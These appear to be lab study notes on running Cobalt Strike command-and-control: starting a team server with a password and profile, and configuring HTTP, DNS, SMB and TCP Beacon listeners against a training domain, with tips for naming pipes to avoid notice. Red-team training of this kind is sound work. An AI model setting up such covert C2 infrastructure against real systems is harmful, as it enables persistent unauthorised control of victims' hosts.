# Command & Control

## Starting the Team Server

1. Log into Attacker Desktop
2. Right-click on Terminal icon in the taskbar
3. Select Team Server (SSH)
4. (Opt) tmux session
5. ```cd cobaltstrike```
6. ```sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile```
7. Once SHA of teamserver appears, run Cobalt Strike client from the taskbar
8. Connect (confirm fingerprint first time)

## Listener Management

Use nickelviper.com for stager, which points to 10.10.5.50

* Egress listeners (Cobalt Strike > Listeners) - allow Beacon to communicate outside of the target network to team server
  * HTTP - allows Beacon to send and receive C2 messages over HTTP GET and/or POST requests (check with ```sudo ss -lntp```)
  * DNS - C2 messages over several lookup/response types like A, AAAA and TXT. TXT used by default (holds the most amount of data). Use pics.nickelviper.com for stager. (Check with ```dig @ns1.nickelviper.com test.pics.nickelviper.com +short```; should give 0.0.0.0.)
  * P2P - chain multiple Beacons together in parent/child relationships to reduce overall host traffic or to allow beacons on hosts unable to egress data out of network. Link child Beacon to an egress HTTP/DNS Beacon, and traffic from the child is sent to the parent, which sends to the team server.
    * SMB - starts a new named pipe server and listens for an incoming connection. This pipe is available both locally and remotely. (Use a name that will blend with existing pipes -- ```PS C:\> ls \\.\pipe\``` shows them.)
    * Raw TCP - binds and listens on the specified port number.

Create all listeners:
| name | payload | host | port | beacons | profile |
|--|--|--|--|--|--|
| dns | windows/beacon_dns/reverse_dns_txt | pics.nickelviper.com | 53 | pics.nickelviper.com | default |
| http | windows/beacon_dns/reverse_http | nickelviper.com | 80 | nickelviper.com | default |
| smb | windows/beacon_bind_pipe | | TSVCPIPE-abcd... | | |
| tcp | windows/beacon_bind_tcp | | 4444 | 0.0.0.0 | |
| tcp-loc | windows/beacon_bind_tcp | | 4444 | 127.0.0.1 | |

## Generating Payloads
## Interacting with Beacon
## Pivot Listeners
## Running as a Service
